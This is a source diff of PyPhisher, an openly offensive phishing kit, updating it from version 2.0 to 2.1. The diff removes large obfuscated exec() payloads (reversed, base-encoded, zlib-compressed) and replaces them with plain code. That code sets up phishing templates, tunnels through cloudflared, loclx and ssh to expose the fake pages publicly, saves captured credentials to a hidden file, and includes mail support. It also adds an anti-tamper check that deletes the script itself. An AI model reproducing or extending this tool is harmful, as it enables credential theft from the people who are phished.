@@ -1,8 +1,8 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : PyPhisher
 # Author     : KasRoudra
-# Version    : 2.0
-# License    : GPL V3
+# Version    : 2.1
+# License    : MIT
 # Copyright  : KasRoudra (2021-2022)
 # Github     : https://github.com/KasRoudra
 # Contact    : https://m.me/KasRoudra
@@ -16,80 +16,98 @@
 # Env        : #!/usr/bin/env python
 
 """
-                    GNU GENERAL PUBLIC LICENSE
-                       Version 3, 29 June 2007
+MIT License
 
- Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
- Everyone is permitted to copy and distribute verbatim copies
- of this license document, but changing it is not allowed.
+Copyright (c) 2022 KasRoudra
 
-                            Preamble
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
 
-  The GNU General Public License is a free, copyleft license for
-software and other kinds of works.
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
 
-  The licenses for most software and other practical works are designed
-to take away your freedom to share and change the works.  By contrast,
-the GNU General Public License is intended to guarantee your freedom to
-share and change all versions of a program--to make sure it remains free
-software for all its users.  We, the Free Software Foundation, use the
-GNU General Public License for most of our software; it applies also to
-any other work released this way by its authors.  You can apply it to
-your programs, too.
-
-  When we speak of free software, we are referring to freedom, not
-price.  Our General Public Licenses are designed to make sure that you
-have the freedom to distribute copies of free software (and charge for
-them if you wish), that you receive source code or can get it if you
-want it, that you can change the software or use pieces of it in new
-free programs, and that you know you can do these things.
-
-  To protect your rights, we need to prevent others from denying you
-these rights or asking you to surrender the rights.  Therefore, you have
-certain responsibilities if you distribute copies of the software, or if
-you modify it: responsibilities to respect the freedom of others.
-
-  For example, if you distribute copies of such a program, whether
-gratis or for a fee, you must pass on to the recipients the same
-freedoms that you received.  You must make sure that they, too, receive
-or can get the source code.  And you must show them these terms so they
-know their rights.
-
-  Developers that use the GNU GPL protect your rights with two steps:
-(1) assert copyright on the software, and (2) offer you this License
-giving you legal permission to copy, distribute and/or modify it.
-
-  For the developers' and authors' protection, the GPL clearly explains
-that there is no warranty for this free software.  For both users' and
-authors' sake, the GPL requires that modified versions be marked as
-changed, so that their problems will not be attributed erroneously to
-authors of previous versions.
-
-  Some devices are designed to deny users access to install or run
-modified versions of the software inside them, although the manufacturer
-can do so.  This is fundamentally incompatible with the aim of
-protecting users' freedom to change the software.  The systematic
-pattern of such abuse occurs in the area of products for individuals to
-use, which is precisely where it is most unacceptable.  Therefore, we
-have designed this version of the GPL to prohibit the practice for those
-products.  If such problems arise substantially in other domains, we
-stand ready to extend this provision to those domains in future versions
-of the GPL, as needed to protect the freedom of users.
-
-  Finally, every program is threatened constantly by software patents.
-States should not allow patents to restrict development and use of
-software on general-purpose computers, but in those that do, we wish to
-avoid the special danger that patents applied to a free program could
-make it effectively proprietary.  To prevent this, the GPL assures that
-patents cannot be used to render the program non-free.
-
-  The precise terms and conditions for copying, distribution and
-modification follow.
-
-Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
 """
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'6284D54F70FFFBEBFBA296DDBD52B97717C5E2377200F3B245A57F4B267A05C214CFDF0784B4A3E75B7D61933121874CD4C8AFAC406890342247603731F7E10E146D5835C009AAA41A38FCD104BB0D7670FE3221EF2E4C332CB316B7AB87E91F84251C1DC71A6AA26F917DCC45817A8608FDB91A0732CD76270D2E30BAEE626B5139082E3660BED331F27FC48FABB60D0AF1C63E3DF595487023C5139B02827C2036531B754A6A01A547C710E5B01ECC3E279621DA5949849B7D14486C1B316F599F0800C295B56038CC483FEE5EFE6B3EB13A0A8250E9CFBACB83E2F98FE414FBD646D3B4E45FE7EAA37C0C0887B581505E7DDB1E789C61F108751B2069203B1238D1426604324DBAE2500BE0957EDDAC9FB455C37EFBE7174F20DB2E100B0B607A0FE47E715419945A20AB4FCBADC110055CEB49DD2E6AF08DC66736DC023CB9F935AD2F88450A062CA6BEA2F5A1FDE0B904398D80AB1FAB51FF36416589B679C5829038A188F6BB4476740FFEB75CF897AEC25FDAA774B25CCEAD14F0E2EC718046545805C70DB3C3D5BF210ED55E2198AA947CB2CD2B35ED682FA1FE332D8480854095C84B7377C3E537B9C3E99C82079D3771EF0CDE6596C2776C293ADE6EE7021A5C000937F84007C3802F6ADEDCF83F384EF4932B0BCD55B5ACA8931D77AD72025D47143072242D1D77A7916EAF3641E6AA57B71D3E521E9EF6F6F7F2403A52F2642B93CE2E27BE28AF34F4862AEBC3DFC66B46BF4312AAFC9819DBE2992940AE15E9B3A733C2DC127DC407A6BC503E4E323DE5340BB6349EF1E34FAE6F6F2714108F91F37794DDCDBFC43C4A23476A726EE6D2E8500957AE8EE55BA3FB78274CB7B1B4CE8A5BF6DC7D631DB2862F5F2DDB1771C3A770F2417857D93D86EE1FB240620A3E44C375ABADC2443E1DE00BFC599620317BD9BF95705BEBFD8B3437801D19D56BD9FE92166372AD0D7E175A328E4FAA2398D1C82BD41D98C67E2B37E95AAF4297A5A59DB747F3A2F3376AD77B616E5EB93D7EC9467B25C3547BCEF5E5BE25A5435D89A9D7F9158459AA1BF0687FE741CC7DEB7AFDC686FBF37D7F7FBEBE7F9FBFEFF7781C40633DA2495A64A6731FCEB3AEBB846CDB9FE1606C63F6DD33F848809342E8D54952C987'))
+from argparse import ArgumentParser
+from importlib import import_module as eximport
+from glob import glob
+from hashlib import sha256
+from json import (
+    dumps as stringify,
+    loads as parse
+)
+from os import (
+    getenv,
+    kill,
+    listdir,
+    mkdir,
+    mknod,
+    popen,
+    remove,
+    rename,
+    replace,
+    system
+)
+from os.path import (
+    abspath,
+    basename,
+    dirname,
+    isdir,
+    isfile,
+    join
+)
+from platform import uname
+from re import search, sub
+from shutil import (
+    copy2,
+    copyfile,
+    copytree,
+    get_terminal_size,
+    rmtree,
+)
+from signal import (
+    SIGINT,
+    SIGKILL,
+    SIGTERM
+)
+from subprocess import (
+    DEVNULL,
+    PIPE,
+    Popen,
+    STDOUT,
+    call,
+    run
+)
+from smtplib import SMTP_SSL as smtp
+from socket import (
+    AF_INET as inet,
+    SOCK_STREAM as stream,
+    setdefaulttimeout,
+    socket
+)
+from sys import (
+    argv,
+    stdout,
+    version_info
+)
+from tarfile import open as taropen
+from time import (
+    ctime,
+    sleep,
+    time
+)
+from zipfile import ZipFile
 
 
 # Color snippets
@@ -109,7 +127,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.0"
+version="2.1"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -129,16 +147,9 @@ logo = f"""
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
 {green}         __/ |{" "*19}       {cyan}[v{version}]
-{cyan}        |___/  {" "*11}      {red}[By KasRoudra]
+{cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
 """
 
-nr_help = f"""
-{info}Steps: {nc}
-{blue}[1]{yellow} Go to {green}https://ngrok.com
-{blue}[2]{yellow} Create an account 
-{blue}[3]{yellow} Login to your account
-{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
-"""
 
 lx_help = f"""
 {info}Steps: {nc}
@@ -149,9 +160,9 @@ lx_help = f"""
 """
 
 packages = [ "php", "ssh" ]
-modules = [ "requests", "bs4" ]
-tunnelers = [ "ngrok", "cloudflared", "loclx" ]
-processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
+modules = [ "requests", "bs4", "rich" ]
+tunnelers = [ "cloudflared", "loclx" ]
+processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 
 
 try:
@@ -185,17 +196,32 @@ for module in modules:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
-from requests import get, Session
 from bs4 import BeautifulSoup
+from requests import get, head, Session
+from rich.console import Console
+from rich.panel import Panel
+from rich.progress import (
+    BarColumn,
+    Progress,
+    TextColumn,
+    TimeRemainingColumn,
+    TransferSpeedColumn
+)
+from rich.traceback import install as override_default_traceback
+
+override_default_traceback()
+cprint = Console().print
 
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-websites_url = f"https://github.com/KasRoudra/PyPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
+repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
+websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
-# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
+# CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
 home = getenv("HOME")
+ssh_dir = f"{home}/.ssh"
 sites_dir = f"{home}/.websites"
 templates_file = f"{sites_dir}/templates.json"
 tunneler_dir = f"{home}/.tunneler"
@@ -220,24 +246,231 @@ mask = ""
 default_port = 8080
 default_tunneler = "Cloudflared"
 default_template = "60"
-nr_command = f"{tunneler_dir}/ngrok"
 cf_command = f"{tunneler_dir}/cloudflared"
 lx_command = f"{tunneler_dir}/loclx"
 if isdir("/data/data/com.termux/files/home"):
     termux = True
-    nr_command = f"termux-chroot {nr_command}"
     cf_command = f"termux-chroot {cf_command}"
     lx_command = f"termux-chroot {lx_command}"
     saved_file = "/sdcard/.creds.txt"
 else:
     termux = False
     saved_file = f"{home}/.creds.txt"
-    
 
 
 print(f"\n{info}Please wait!{nc}")
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===GFN6643A67P76VP7TNAYLARF2ZDOPVO52UT2RRFW5RISA6XIF4JWMF4N4VXR6R5RYCCIOE6AIH4SEMZC4KKGBQ6HSDX5NAG6HWZGMMGWATHRDHPK2FJWSMGN3T3T3JOSCM6RVU2JBEH74ZCALRT24E4BAPTIM62XZXZL6452QB4DJPDG7JZKQTSZBDIUDBEYNUITRJTYXYW3UDIFEFHMDKE6CMH45AJOSHYDYRNX2RI5QRBJF5FESVUIO22346QQVMQICAXSS5CAPAKLWKQJPJYJHM46VB3LKB4RGQAQO5FD7YUIUFUOZ3EE4XUGCA3WDW7CVAIHTHU7MAKW22GAI6ANYPZZAXZPA26DKLAQ64JKQX5UKLVM42XHRB4Z7PEKS65CWAOWAUCTMSJBMYGZ4IAWIRW5TWNLVHQIGIV7YXK2VVFA6J37CVMXYOGBMBMB6BS62WPAW57YODUE24AATH7L3JA7ZVU3E5AIZRWFVEAERIODNPDC64A645A4BHGQYBU4NUMNM2A7MPAAUFRUFPDRWCQXVVXJO7MHAVWDMOW5CNDDB4P75MQJAEDRFMQURV5AGUIRQUY6QSRMOOVSJYAKGWAWFJB67QU7AHCBTYW7DQEIAOI6EA6P2KPBWA4MJ36D7TIZPX52UGVWH2XHOR6DIQYRHLMA4M4Q5VVNFGZGDRHGAZR5VF34TO5VPK4DALH2CMBKZ4PHANISMGAWHFWVLAJPAZQK3UYPGVN74SDNXSDIHTYBCE2XEQXCWRMWXCQ77PTQH7NZRWIU5VBER4AYWGY4PCTXOTPWUBBXKF7Q2LWHY5LC3GJXO7KIUZAYY7ZO5O3MF4TWAL5GQZOCV5576LAMM2NSS3GTUKGAOFZVYWSBKMUB33ADVNEQLIT27WJ75J4IUWKOKQOYTYEABDU4RSQNEUJG4DHCHYHE27KVVNW5NNFBABONVOA7TC7DADNITHNQTH4GISKQLETLGVUDGPGFR6D5ANUQCE7Q3CJTFWXZSEAVR35F5W7PBVFWICZOUKXMPO5K4IRBUQALUPNGPV47QX37EKRZRCYUTWC67QPSBKYITJI5B2N7F5VUEZ33U6KD54CGBBTS2QMO525P6UQCEE3VX6HTFVOZORAFDQXYCYSHZQZ6QTMRMKMNAFVVF6KYEBDGGNVKNGXKBWK7PPS5RX7HBDZBLB5C6R3ECFQFS5XSECQE3Y5ZWB3KQLKAPBGD7GRNAJNMSBAZFPN4ZRVB4XE3US7CKLUJPD3B4XHMOFJKMEV7S6G76ELMS2GPJLQ47RSMBO64TOFEZ4A7TJQPQWY7N2D3FLY3K52LQWFEMY65H562HH7S7T5XG2PATRUF6A36YEJY2ZZ3VV25HWG7H4LOED3I6WHX33FMTYA5CGB6KNTU4LJZTAOUSJ62NR7CHJGKZAV6EAYUTWYEJURNQZOD2IIHFUFJBLYGOBHTNTJUMSTFLJGFF5MNX4GS5VUA7CP6BBGQ77OYFDUY6DPYX2G277GYBYGT6EK2OCLULJSUKWPJ5QXRMUAZQNMUQHNCFGECN6W3QCIZXBVNDKO5CE4XFF6VJRGJOSAXAOCAPDDW5G4PVLZVRPXG4DH5ZZQM7S2I6UC3ZPCW7GXJXPGCYN3KNJAL6Z5GYW5MW4BERWQKSPCMPKFRFYYPJC35WJKLJUWJPNBYRUIPOLWLDF3D6HRLFDXPYY2U7XTVN36AI5T5STFGQRLQKSOWNPPKR2JPJPR3DCOONJYF562CZYLAUQQONMYEEDZ6QBD5QXSW4I5Y6DIOXIC6SN6MFG5LHE4NEEFJEFJ4OTQVFFLUBOB33NHQQXYWILBC4NO7YVVRCB54MPB6WS7CFWF3WFQRU7SXWNURI6UTATOVCGNECL4VVE5BOYKGDQJWSUJQRRQU2A5UQVV6FVJEAQENEWFPRX7PQD5Y7CYB4ILEC4CIKIEM23WPFDANW5TO6BVRZEWQKP3JKUNTUHYNDDAXCWQL6QMZAJZLYIBETKFNZNQMEEROPUPOTN5Z75M3DPYAM2MYAW3QSRFDHUKRNY5QGNQ3AA4DQKWYGEMVXFTBHZRWUKC7EQTBTR7CN47GR3VYKIH3M5QWBGE7JE373H3AQRUI76SOL5MDWFXKOKO5QNGEZBV7DMB5BNBIGJUIANYGZIR5RZCOPOGMMQX65AZE4ZPJ5AISAFUOZZCHTXVVSACNP6PXODQBUYXG2VHOLO2IRSMEOG6O736C5U7SH3H4JAKMQLYNJ45H6TVOESRJZEQMSVBFEBW4RPHUACUN4T6QQHX532WRJWG7VQPRQDGLQ6T4ULBO7K6URTA26GLJP4QDCS5KSHCHGJENXJFFQLRLTELROSF3YISZFJYCCQCXDQWLXTP3M5DVFJOOFIAZNJ52OOVSU4KPLXOE4DUOKBKW45Z2JI2JL2IOCKCNA2TDZKUQKXCMODACE2B4TVDEGCUAWHOVRL3QBMARZ4CXOQQBBK5QOX7WCXJD53GHKXJFOZUHWH6AD3RSR4AMCMGSH6N7KW7U2QWC5FMFVNQMDMAITPPEC3DQVNTL44D3D6KUIWGACQUPBACOLP54OIGOHFMNJPPJ2KCHX2DJYBJYF3AQXFDBUMYYUFMMZHVEBEAPPQLXSSELJ4GEUKYVPEMTJGQHOXI4KVTKZKYJFSM4YNPWLZ6AKKOVFUV55YHTVT7G2HJ3KVGZW3HDPAD3YJP4ZNVBWESW2INHN7HJI23PVEUPKGC7GLER4PPGT7ANXUUKDOPD5NYZGFIC4MGIB4GJNIKTA4EDX57TS2NUYYZQ43K5MXHULMGJWXBZ5BBAB6YCW4YEWPPNLZ4WFNAROFEWMWXBEIW6ST4Q2V5A4J3RVACHYLJWZ3Z7AOT4WKGCKIDXCQ6T53HUZXVZ4VXYQ2352OOWXFTPUWXECXNFEMFVUXB5C2EDNMJMAWMQHERHPHBGPXKHD2RKVKJ42S6YTUZRFRKTBJLCMOOHHE74Z6QZXSUPAFQYFJ3BHPR3HVUUXFZI7YW2KAJ4TEXG6CSVV3LO5OXJKATSAYNY3MO564OEELJ3W2C5ZP5WF5EQDCP7OOYLHS5W3F2NRXCYOAK4DDOZIG2PPANZT6IYK3I567QP5CT25FMM2HX5AKXLTDCTKG4U3XMG3B3DHYJ3BIIXVOKBS5DLVUN7BWUJD6LXKJQXNQ4IQ6O56TWZPLRX6VIXYJ7FFA6X23GTNTHZQVFCJTXWEDB7QDK6X5TRMHCN25RSKHAVDFI6Z4LE7ATZPNJYAGFR3PWX3LL6NPO4R6QHIWEEIHINS4N3FF7KX32LAE6PYUGDNAWS3ZTXTT63OTDRWHZYZ4ETZYQRZKFNZASCR7XRNCXVQRFDZPIL6NH543O6VYCOKF7E6TEPTOL74QKTJT6BPHQ6UGDUUPEM7XHPXN6G66ETZIH3X3JJYHWDUFEM4UAXDS5KFHNO6VT6ZR7HAHFIE4F4TH4QYEM5ZJNBIS6QJGIXHWNCPRZJ5TRUF2LG2YBFNJWSSXOPXR7LE65LP7IHMPLOWBNNBKO6JV5INW34MZNVCW3DNXGMM73GG2X3LEFGQDIIJCFAHKKFQRK4XSYMC57OPHPR4PRJT7BD5MDFA7GHWBID4P6PU5EIPDPLKUGA2RNF2J6JHGPNTJY2IQXUUHJ246MM3O2TEFW2ZC64RSLORLTMKLIGBV7YLGWFNBP64ML5MCTLHS2TPOYJ3MBQP2KGFXTFG4RUKIFRCXWQOLPVSKXAEOXHELFHTCCC7KHGYM6OPDB3RJ7MGA4DTMON4RVP764DIHTOLNMMCGXD5Z6NTQ6NXH54VVNSFOFOU2TDJPTUD5ONI4JZEG3MRYU6B3MHSUZYO5TU54I4RSH2RDWH6MOMEVLC46CS4NX77KCBMVP7EOPUB6NOEVUVRQSPCHP6FLTHSI5HVNI4HGIOFTGPFXF7TFKAEOXK6GVCK4BNXNJEGOWJE2JLPNJYLRSJ2CXIOCQNLJ7MVCN42J6P3QZP7U2XNOOTW2FOF43HFFBKDFXCOHLW4RZFEK6XBRCPZKRHB5HKZ3IOK5WOZ2RXE253NS4J7K3T7FM2Z2PDW7GXRG5I4WYGXLOWTR4IIECIU5TA6EZPUZ2LG5TQVSHCTDMKSIFXLK2N2CK2TYITXMXT3OCZSBRSGIJ63BM3Z234RYV346LLGABNB5NIKYA5OQ2P3RTFJVF2ZUXPM6ATWT56HXNLNX3I4H2OUDABKVUHOZM3PKXZGRKOTVEMBLGNLWM46WF7E2V6RXCJXAJ5FQ5HRLQAN77QTVM6Z2VSXJM2K6V7NOJVFKG2LYJ2Q7QAXTFKV7NSOGBYOSHHHLMMYLXWOUNKJREYXI36BCRHL6OPTIERCCRUCF6UDLVM7DW3NH45D5O2XKYZGWZMQSWKTY52U3JHSMOEJUDG6FX7FD2X4H2DFMLY3LTFJMZG6ASKND7TNOJXJUSL75OUPUZLN2CZ32HJ6ZKBZJ53HEKA7IXMSF5VH37VPZM55V4URELZ6ZK77GJY332TKI3NEPOF46GF4IJCLT6JPEJ5RRYZXNRQECYTKXMPJ5ELCZ2MLWSX7SQ5TH22LHRDRR3F2V6PHKPBLX5FRDTM5RZ5CNEQ4AX4ZFVZPHQPPOKTUJ5WZBSXFHSSGH3PLRPY6NK4D5LP7IRN5RVIQAL7LHYDOBG4HKWLR4V6RY42WI4JVBWMHA45OVV7RGVWQPDBMGMRJCR6EEVTWBZ525I4DARCXHZLMSCFHS3PTLPFYXC6WUK2Y3UCL4LPCWFTVYEDFJRP5BRU3OW4JWZZBRO2T6UK7Z5RZPTHZ52DPKV6D5VXUONQR6JCPSHUAPO6BGG3LED2ECD7I54QBPZXSRNE4UL4ZNB3HJJSGF7VZCJFWRICJEXHYET2TL7GRCEP6IQGVWLFC57BZ74C6TDRWEZZIVKTXRBTT45U2L5WQ3JWQUI6RYGL44VX4YTXX6UUVVMPKQWI5HZRTU6NOZL5646I6SA6LZZ76ZE2XH2XCXE7E5YWSQU3THX2JOTXYLBJD4AMOGDTEDTU7I2USXWXPKNDZSVS7S62PXPTUN5P2F6DASCWR6WTLH5QEZVVIKUMICUF4S2N37AJBP6C53O727OIFBOP43U2G655E7CT7PIKS7YCHKUW5E7IZ5SNGTUIGKNKLGZ7YYLH5RDVAPQODFL73JZ2NTGEP25K7RHFMX3YHQRT2LE6IO2V62QROVCXL3J6Y4ZROX6FCXV3VXM757753XO6ZP77PP66577NZHHP4ZSJAPKEW3MP5OO6RX6AVM7ISIESACYNDNB4YJLT6XJ5SFMEQ22LWJ2F3BOCP'))
+argparser = ArgumentParser()
+
+argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"PyPhisher's server port [Default : {default_port}]")
+argparser.add_argument("-o", "--option", help="PyPhisher's template index [Default : null]")
+argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
+argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
+argparser.add_argument("-s", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
+argparser.add_argument("-u", "--url", help="Redirection url after data capture [Default : null]")
+argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
+argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
+argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
+argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
+
+
+args = argparser.parse_args()
+
+port = args.port
+option = args.option
+region = args.region
+subdomain = args.subdomain
+tunneler = args.tunneler
+url = args.url
+mode = args.mode
+troubleshoot = args.troubleshoot
+key = args.nokey if mode != "test" else False
+update = args.noupdate
+
+local_url = f"127.0.0.1:{port}"
+
+ts_commands = {
+    "cloudflared": f"{cf_command} tunnel -url {local_url}",
+    "localxpose": f"{lx_command} tunnel http -t {local_url}",
+    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "cf": f"{cf_command} tunnel -url {local_url}",
+    "loclx": f"{lx_command} tunnel http -t {local_url}",
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+}
+
+
+# My utility functions
+
+# Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
+def is_installed(package):
+    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
+def is_running(process):
+    exit_code = bgtask(f"pidof {process}").wait()
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Check if a json is valid
+def is_json(myjson):
+  try:
+    parse(myjson)
+    return True
+  except:
+    return False
+
+
+# A simple copy function
+def copy(path1, path2):
+    if isdir(path1):
+        if isdir(path2):
+             rmtree(path2)
+        copytree(path1, path2)
+    if isfile(path1):
+        if isdir(path2):
+            copy2(path1, path2)
+
+# Delete files/folders if exist
+def delete(*paths, recreate=False):
+    for path in paths:
+        if isdir(path):
+            if recreate:
+                rmtree(path)
+                mkdir(path)
+            else:
+                rmtree(path)
+        if isfile(path): 
+            remove(path)
+
+
+# A poor alternative of GNU/Linux 'cat' command returning file content
+def cat(file):
+    if isfile(file):
+        with open(file, "r") as filedata:
+            return filedata.read()
+    return ""
+
+
+# Another poor alternative of GNU/Linux 'sed' command to replace and write
+def sed(text1, text2, filename1, filename2=None, occurences=None):
+    filedata1 = cat(filename1)
+    if filename2 is None:
+        filename2 = filename1
+    if occurences is None:
+        filedata2 = filedata1.replace(text1, text2)
+    else:
+        filedata2 = filedata1.replace(text1, text2, occurences)
+    write(filedata2, filename2)
+        
+# Another poor alternative of GNU/Linux 'grep' command for regex search
+def grep(regex, target):
+    if isfile(target):
+        content = cat(target)
+    else:
+        content = target
+    results = search(regex, content)
+    if results is not None:
+        return results.group(1)
+    return ""
+    
+# Run shell commands in python
+def shell(command, capture_output=False):
+    try:
+        return run(command, shell=True, capture_output=capture_output)
+    except Exception as e:
+        append(e, error_file)
+    # return run(command.split(" "), shell=True)
+    # return call(command, shell=True)
+    
+# Run task in background supressing output by setting stdout and stderr to devnull
+def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
+    try:
+        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
+    except Exception as e:
+        append(e, error_file)
+        
+if sha256(logo.encode("utf-8")).hexdigest() != "931df196786d840c731d49fec1b43ab15edc7977f4e300bfb4c2e3657b9c591d":
+    print(f"{info}Visit: {repo_url}")
+    bgtask(f"xdg-open {repo_url}")
+    delete(__file__)
+    exit(1)
+
+
+# Write/Append texts to a file
+def write(text, filename):
+    with open(filename, "w") as file:
+        file.write(str(text)+"\n")
+
+
+# Write/Append texts to a file
+def append(text, filename):
+    with open(filename, "a") as file:
+        file.write(str(text)+"\n")
+        
+
+def get_meta(url):
+    # Facebook requires some additional header
+    if "facebook" in url:
+        headers = {
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "dnt": "1", 
+            "content-type": "application/x-www-form-url-encoded",
+            "origin": "https://m.facebook.com",
+            "referer": "https://m.facebook.com/", 
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors", 
+            "sec-fetch-user": "empty", 
+            "sec-fetch-dest": "document", 
+            "sec-ch-ua-platform": "Android",
+            "accept-encoding": "gzip, deflate br", 
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+        }
+    else:
+        headers = {
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+        }
+    allmeta = ""
+    try:
+        response = get(url, headers=headers).text
+        soup = BeautifulSoup(response, "html.parser")
+        metas = soup.find_all("meta")
+        if metas is not None and metas!=[]:
+            allmeta = "\n".join([str(meta) for meta in metas])
+    except Exception as e:
+        append(e, error_file)
+    return allmeta
+    
+# Replace the default ugly exception message
+def exception_handler(e):
+    lines_arr = []
+    tb = e.__traceback__
+    while tb is not None:
+        if tb.tb_frame.f_code.co_filename == abspath(__file__):
+            lines_arr.append(str(tb.tb_lineno))
+        tb = tb.tb_next
+    name = type(e).__name__
+    append(e, error_file)
+    if ":" in str(e):
+        message = str(e).split(":")[0]
+    elif "(" in str(e):
+        message = str(e).split("(")[0]
+    else:
+        message = str(e)
+    line_no = lines_arr[len(lines_arr) - 1]
+    lines_no = ", ".join(lines_arr)
+    print(f"{error}{name}: {message} at lines {lines_no}")
+
+
 
 # Print lines slowly
 def sprint(text, second=0.05):
@@ -272,8 +505,17 @@ def center_text(text):
 # Print decorated file content
 def show_file_data(file):
     lines = cat(file).splitlines()
+    text = ""
     for line in lines:
-        print(f"{cyan}[{green}*{cyan}] {yellow}{line}")
+        text += f"[cyan][[green]*[cyan]][yellow] {line}\n"
+    cprint(
+        Panel(
+            text.strip(),
+            title="[bold green]\x50\x79\x50\x68\x69\x73\x68\x65\x72[/][cyan] Data[/]", 
+            title_align="left",
+            border_style="blue",
+        )
+    )
 
         
 # Clear the screen and show logo
@@ -297,17 +539,18 @@ def installer(package, package_name=None):
             if not is_installed(package):
                 sprint(f"\n{info}Installing {package}{nc}")
                 if pacman=="pacman":
-                    shell(f"sudo {pacman} -S {package_name}")
+                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                 elif pacman=="apk":
-                    shell(f"sudo {pacman} add {package_name}")
+                    if is_installed("sudo"):
+                        shell(f"sudo {pacman} add {package_name}")
+                    else:
+                        shell(f"{pacman} add -y {package_name}")
                 elif is_installed("sudo"):
                     shell(f"sudo {pacman} install -y {package_name}")
                 else:
                     shell(f"{pacman} install -y {package_name}")
                 break
     if is_installed("brew"):
-        if not is_installed("ngrok"):
-            shell("brew install ngrok/ngrok/ngrok")
         if not is_installed("cloudflare"):
             shell("brew install cloudflare/cloudflare/cloudflared")
         if not is_installed("localxpose"):
@@ -329,40 +572,22 @@ def killer():
             else:
                 print()
 
-
 # Internet Checker
-def internet2(host="8.8.8.8", port=53, timeout=10):
-    while True:
-        try:
-            if not update:
-                break
-            setdefaulttimeout(timeout)
-            socket(inet, stream).connect((host, port))
-            break
-        except Exception as e:
-            print(f"\n{error}No internet!\007")
-            sleep(2)
 
-def internet():
-    connection = HTTPSConnection("8.8.8.8", timeout=5)
-    while True:
+def internet(url="https://api.github.com", timeout=5):
+    while update:
         try:
-            if not update:
-                connection.close()
-                break
-            connection.request("HEAD", "/")
+            head(url=url, timeout=timeout)
             break
         except:
-            print(f"{error}No internet!\n\007")
+            print(f"\n{error}No internet!{nc}\007")
             sleep(2)
-        finally:
-            connection.close()
 
         
 # Send mail by smtp library
 def send_mail(msg):
